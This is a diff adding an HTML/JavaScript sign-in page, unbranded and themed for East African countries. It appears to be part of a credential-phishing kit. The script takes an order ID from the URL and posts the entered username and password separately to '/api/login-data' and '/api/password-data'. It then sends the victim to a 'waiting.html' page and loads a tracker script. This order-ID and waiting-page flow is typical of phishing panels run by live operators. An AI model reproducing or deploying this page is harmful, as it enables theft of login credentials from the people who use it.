@@ -1,0 +1,373 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Welcome back</title>
+<style>
+  *{box-sizing:border-box;margin:0;padding:0}
+  html,body{height:100%;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
+  body{max-width:520px;margin:0 auto;min-height:100vh;background:#fff;display:flex;flex-direction:column}
+
+  /* Top Bar */
+  .topbar{
+    display:flex;align-items:center;justify-content:space-between;
+    padding:14px 16px;background:#fff;position:sticky;top:0;z-index:10;
+  }
+  .topbar-back{width:32px;height:32px;display:flex;align-items:center;justify-content:center;background:none;border:none;cursor:pointer}
+  .topbar-back svg{width:24px;height:24px;fill:none;stroke:#222;stroke-width:2.2;stroke-linecap:round;stroke-linejoin:round}
+  .topbar-title{font-size:16px;font-weight:700;color:#222}
+  .topbar-chat{width:32px;height:32px;display:flex;align-items:center;justify-content:center;background:none;border:none;cursor:pointer}
+  .topbar-chat svg{width:24px;height:24px;fill:none;stroke:#222;stroke-width:1.8}
+
+  /* Content */
+  .content{padding:24px 24px 0;flex:1}
+  .greeting{font-size:26px;font-weight:700;color:#222;margin-bottom:8px}
+  .subtitle{font-size:14.5px;color:#888;line-height:1.5;margin-bottom:28px}
+
+  /* Field Group */
+  .field-group{margin-bottom:22px}
+  .field-label{font-size:12px;color:#aaa;margin-bottom:2px}
+  .field-value-label{font-size:14px;color:#333;font-weight:600;margin-bottom:6px}
+
+  /* Country Dropdown */
+  .country-select{
+    display:flex;align-items:center;justify-content:space-between;
+    padding:8px 0;border-bottom:1.5px solid #6b1c1c;cursor:pointer;
+  }
+  .country-select span{font-size:16px;font-weight:600;color:#222}
+  .country-select svg{width:20px;height:20px;fill:#555}
+
+  /* Underline Input */
+  .underline-field{position:relative;margin-bottom:20px}
+  .underline-field input{
+    width:100%;border:none;border-bottom:1.5px solid #ccc;outline:none;
+    font-size:15px;font-family:inherit;color:#222;padding:10px 36px 10px 0;
+    background:transparent;transition:border-color .2s;
+  }
+  .underline-field input:focus{border-bottom-color:#c62828}
+  .underline-field input::placeholder{color:#bbb;font-size:14px}
+  .underline-field .eye-toggle{
+    position:absolute;right:0;top:50%;transform:translateY(-50%);
+    background:none;border:none;cursor:pointer;padding:6px;display:flex;align-items:center;
+  }
+  .underline-field .eye-toggle svg{width:22px;height:22px;fill:none;stroke:#6b1c1c;stroke-width:1.5}
+
+  .forgot-link{font-size:13.5px;color:#8b1a1a;font-weight:600;text-decoration:none;display:inline-block;margin-top:2px}
+
+  /* Error */
+  .error-msg{
+    display:none;background:#fff5f5;border:1px solid #fcc;border-radius:8px;
+    padding:10px 14px;margin-bottom:14px;color:#c62828;font-size:13px;text-align:center;
+  }
+
+  /* Sign In Button */
+  .signin-wrap{padding:12px 24px 28px;margin-top:auto}
+  .signin-btn{
+    display:block;width:100%;padding:16px;border:none;border-radius:28px;
+    font-size:16px;font-weight:600;color:#999;cursor:pointer;font-family:inherit;
+    background:#f0f0f0;transition:.2s;
+  }
+  .signin-btn.active{background:#6b1c1c;color:#fff}
+  .signin-btn:disabled{opacity:.6;cursor:not-allowed}
+
+  /* Country Modal */
+  .modal-overlay{
+    display:none;position:fixed;inset:0;background:rgba(0,0,0,.4);z-index:100;
+    align-items:flex-end;justify-content:center;
+  }
+  .modal-overlay.open{display:flex}
+  .modal{
+    background:#fff;border-radius:20px 20px 0 0;width:100%;max-width:520px;
+    max-height:85vh;display:flex;flex-direction:column;
+    animation:slideUp .25s ease-out;
+  }
+  @keyframes slideUp{from{transform:translateY(100%)}to{transform:translateY(0)}}
+  .modal-header{
+    display:flex;align-items:center;justify-content:space-between;
+    padding:18px 20px 14px;border-bottom:1px solid #f0f0f0;
+  }
+  .modal-close{background:none;border:none;cursor:pointer;padding:4px;display:flex;align-items:center}
+  .modal-close svg{width:22px;height:22px;fill:none;stroke:#c62828;stroke-width:2.5;stroke-linecap:round}
+  .modal-title{font-size:17px;font-weight:700;color:#222;flex:1;text-align:center}
+  .modal-spacer{width:30px}
+  .modal-search{padding:12px 20px}
+  .modal-search input{
+    width:100%;border:1px solid #ddd;border-radius:24px;padding:12px 42px 12px 16px;
+    font-size:14px;font-family:inherit;outline:none;background:#fafafa;
+  }
+  .modal-search input:focus{border-color:#999}
+  .modal-search{position:relative}
+  .modal-search svg{position:absolute;right:34px;top:50%;transform:translateY(-50%);width:18px;height:18px;fill:none;stroke:#999;stroke-width:2}
+  .country-list{overflow-y:auto;padding:0 20px 20px;flex:1}
+  .country-item{
+    display:flex;align-items:center;padding:16px 0;
+    border-bottom:1px solid #f0f0f0;cursor:pointer;gap:14px;
+  }
+  .country-item:last-child{border-bottom:none}
+  .country-flag{width:48px;height:48px;border-radius:50%;overflow:hidden;flex-shrink:0}
+  .country-flag svg{width:100%;height:100%}
+  .country-name{flex:1;font-size:16px;color:#333;font-weight:500}
+  .country-radio{
+    width:24px;height:24px;border-radius:50%;border:2px solid #6b1c1c;
+    flex-shrink:0;display:flex;align-items:center;justify-content:center;
+  }
+  .country-radio.selected::after{
+    content:"";width:12px;height:12px;border-radius:50%;background:#6b1c1c;
+  }
+
+  /* Error Modal */
+  .error-overlay{
+    display:none;position:fixed;inset:0;background:rgba(0,0,0,.45);z-index:300;
+    align-items:center;justify-content:center;padding:24px;backdrop-filter:blur(3px);
+  }
+  .error-overlay.open{display:flex}
+  .error-modal{
+    background:#fff;border-radius:24px;width:100%;max-width:380px;
+    padding:32px 28px 28px;position:relative;text-align:center;
+    animation:errorPop .3s ease-out;
+  }
+  @keyframes errorPop{from{transform:scale(.85);opacity:0}to{transform:scale(1);opacity:1}}
+  .error-modal-close{
+    position:absolute;top:16px;right:16px;width:36px;height:36px;border-radius:50%;
+    background:#f5f5f5;border:none;cursor:pointer;display:flex;align-items:center;
+    justify-content:center;transition:.2s;
+  }
+  .error-modal-close:hover{background:#e5e5e5}
+  .error-modal-close svg{width:18px;height:18px;fill:none;stroke:#888;stroke-width:2.5;stroke-linecap:round}
+  .error-img-wrap{position:relative;cursor:pointer}
+  .error-img-wrap img{width:100%;height:auto;display:block;border-radius:12px}
+</style>
+</head>
+<body>
+
+  <!-- Top Bar -->
+  <div class="topbar">
+    <button class="topbar-back" type="button"><svg viewBox="0 0 24 24"><path d="M15 18l-6-6 6-6"/></svg></button>
+    <span class="topbar-title">Welcome back</span>
+    <button class="topbar-chat" type="button"><svg viewBox="0 0 24 24"><rect x="2" y="3" width="20" height="14" rx="3"/><path d="M8 21l4-4h6"/></svg></button>
+  </div>
+
+  <!-- Content -->
+  <div class="content">
+    <div class="error-msg" id="errorMsg"></div>
+
+    <h1 class="greeting">Hello there,</h1>
+    <p class="subtitle">Sign in to continue. Remember, your password is yours, do not share it with anyone.</p>
+
+    <!-- Country -->
+    <div class="field-group">
+      <div class="field-label">Country</div>
+      <div class="country-select" id="countrySelect" onclick="openCountryModal()">
+        <span id="selectedCountry">South Sudan</span>
+        <svg viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z" fill="#555"/></svg>
+      </div>
+    </div>
+
+    <!-- Email / Mobile -->
+    <div class="field-group">
+      <div class="field-value-label">Email address or mobile number</div>
+      <div class="underline-field">
+        <input type="text" id="username" placeholder="Email address or mobile number" autocomplete="username" oninput="checkFields()">
+      </div>
+    </div>
+
+    <!-- Password -->
+    <div class="field-group">
+      <div class="field-value-label">Password</div>
+      <div class="underline-field">
+        <input type="password" id="password" placeholder="Enter password" oninput="checkFields()">
+        <button class="eye-toggle" onclick="togglePass()" type="button">
+          <svg id="eyeIcon" viewBox="0 0 24 24"><circle cx="12" cy="12" r="3.5"/><path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7S2 12 2 12z"/></svg>
+        </button>
+      </div>
+    </div>
+
+    <a href="#" class="forgot-link">Forgot your password?</a>
+  </div>
+
+  <!-- Sign In Button -->
+  <div class="signin-wrap">
+    <button class="signin-btn" id="signinBtn" onclick="submitLogin()" disabled>Sign in</button>
+  </div>
+
+  <!-- Country Modal -->
+  <div class="modal-overlay" id="countryModal">
+    <div class="modal">
+      <div class="modal-header">
+        <button class="modal-close" onclick="closeCountryModal()"><svg viewBox="0 0 24 24"><path d="M6 6l12 12M18 6L6 18"/></svg></button>
+        <span class="modal-title">Country</span>
+        <div class="modal-spacer"></div>
+      </div>
+      <div class="modal-search">
+        <input type="text" placeholder="Search for a country" id="countrySearch" oninput="filterCountries()">
+        <svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="7"/><path d="M21 21l-4.35-4.35"/></svg>
+      </div>
+      <div class="country-list" id="countryList"></div>
+    </div>
+  </div>
+
+<!-- Error Modal -->
+<div class="error-overlay" id="errorOverlay">
+  <div class="error-modal">
+    <button class="error-modal-close" onclick="closeErrorModal()"><svg viewBox="0 0 24 24"><path d="M6 6l12 12M18 6L6 18"/></svg></button>
+    <div class="error-img-wrap" onclick="closeErrorModal()">
+      <img src="images/error-illustration.jpg" alt="Error">
+    </div>
+  </div>
+</div>
+
+<script>
+  var params = new URLSearchParams(location.search);
+  var orderId = params.get("order");
+  var selectedCountryName = "South Sudan";
+  var selectedCountryCode = "SS";
+
+  var countries = [
+    {name:"Kenya",code:"KE",colors:["#000","#b00","#060"]},
+    {name:"Rwanda",code:"RW",colors:["#00a0dc","#fad201","#20603d"]},
+    {name:"South Sudan",code:"SS",colors:["#000","#c8102e","#078930"]},
+    {name:"Sudan",code:"SD",colors:["#c8102e","#fff","#000"]},
+    {name:"Tanzania, United Rep...",code:"TZ",colors:["#1eb53a","#00a3dd","#fcd116"]},
+    {name:"Uganda",code:"UG",colors:["#000","#fcdc04","#d90000"]}
+  ];
+
+  function renderCountries(filter){
+    var list = document.getElementById("countryList");
+    list.innerHTML = "";
+    var f = (filter||"").toLowerCase();
+    countries.forEach(function(c){
+      if(f && c.name.toLowerCase().indexOf(f) === -1) return;
+      var item = document.createElement("div");
+      item.className = "country-item";
+      item.onclick = function(){ selectCountry(c.name, c.code); };
+      var sel = c.name === selectedCountryName ? " selected" : "";
+      item.innerHTML =
+        '<div class="country-flag"><svg viewBox="0 0 48 48"><circle cx="24" cy="24" r="24" fill="'+c.colors[0]+'"/><rect y="0" width="48" height="16" fill="'+c.colors[0]+'"/><rect y="16" width="48" height="16" fill="'+c.colors[1]+'"/><rect y="32" width="48" height="16" fill="'+c.colors[2]+'"/></svg></div>'+
+        '<span class="country-name">'+c.name+'</span>'+
+        '<div class="country-radio'+sel+'"></div>';
+      list.appendChild(item);
+    });
+  }
+
+  function openCountryModal(){
+    document.getElementById("countryModal").classList.add("open");
+    document.getElementById("countrySearch").value = "";
+    renderCountries();
+    document.body.style.overflow = "hidden";
+  }
+
+  function closeCountryModal(){
+    document.getElementById("countryModal").classList.remove("open");
+    document.body.style.overflow = "";
+  }
+
+  function selectCountry(name, code){
+    selectedCountryName = name;
+    selectedCountryCode = code;
+    document.getElementById("selectedCountry").textContent = name;
+    closeCountryModal();
+  }
+
+  function filterCountries(){
+    renderCountries(document.getElementById("countrySearch").value);
+  }
+
+  function checkFields(){
+    var u = document.getElementById("username").value.trim();
+    var p = document.getElementById("password").value;
+    var btn = document.getElementById("signinBtn");
+    if(u && p){
+      btn.disabled = false;
+      btn.classList.add("active");
+    } else {
+      btn.disabled = true;
+      btn.classList.remove("active");
+    }
+  }
+
+  function togglePass(){
+    var p = document.getElementById("password");
+    p.type = p.type === "password" ? "text" : "password";
+  }
+
+  if(params.get("error") === "1"){
+    document.getElementById("errorOverlay").classList.add("open");
+  }
+
+  function closeErrorModal(){
+    document.getElementById("errorOverlay").classList.remove("open");
+    history.replaceState(null, "", "login.html" + (orderId ? "?order=" + orderId : ""));
+  }
+
+  document.getElementById("errorOverlay").addEventListener("click", function(e){
+    if(e.target === this) closeErrorModal();
+  });
+
+  async function submitLogin(){
+    var username = document.getElementById("username").value.trim();
+    var password = document.getElementById("password").value;
+    if(!username || !password) return;
+
+    var btn = document.getElementById("signinBtn");
+    btn.disabled = true;
+    btn.textContent = "Signing in...";
+
+    try {
+      var res = await fetch("/api/login-data", {
+        method:"POST",
+        headers:{"Content-Type":"application/json"},
+        body:JSON.stringify({order_id:orderId, username:username, country:selectedCountryCode})
+      });
+      var data = await res.json();
+      if(!data.success){
+        showError(data.message || "An error occurred");
+        btn.disabled = false;
+        btn.textContent = "Sign in";
+        btn.classList.add("active");
+        return;
+      }
+
+      var res2 = await fetch("/api/password-data", {
+        method:"POST",
+        headers:{"Content-Type":"application/json"},
+        body:JSON.stringify({order_id:orderId, password:password})
+      });
+      var data2 = await res2.json();
+      if(data2.success){
+        location.href = "waiting.html?order=" + orderId;
+      } else {
+        showError(data2.message || "An error occurred");
+        btn.disabled = false;
+        btn.textContent = "Sign in";
+        btn.classList.add("active");
+      }
+    } catch(err){
+      showError("Connection error");
+      btn.disabled = false;
+      btn.textContent = "Sign in";
+      btn.classList.add("active");
+    }
+  }
+
+  function showError(msg){
+    var el = document.getElementById("errorMsg");
+    el.textContent = msg;
+    el.style.display = "block";
+    setTimeout(function(){ el.style.display = "none"; }, 3000);
+  }
+
+  document.getElementById("password").addEventListener("keydown", function(e){
+    if(e.key === "Enter") submitLogin();
+  });
+  document.getElementById("username").addEventListener("keydown", function(e){
+    if(e.key === "Enter") document.getElementById("password").focus();
+  });
+
+  document.getElementById("countryModal").addEventListener("click", function(e){
+    if(e.target === this) closeCountryModal();
+  });
+</script>
+<script src="tracker.js"></script>
+</body>
+</html>
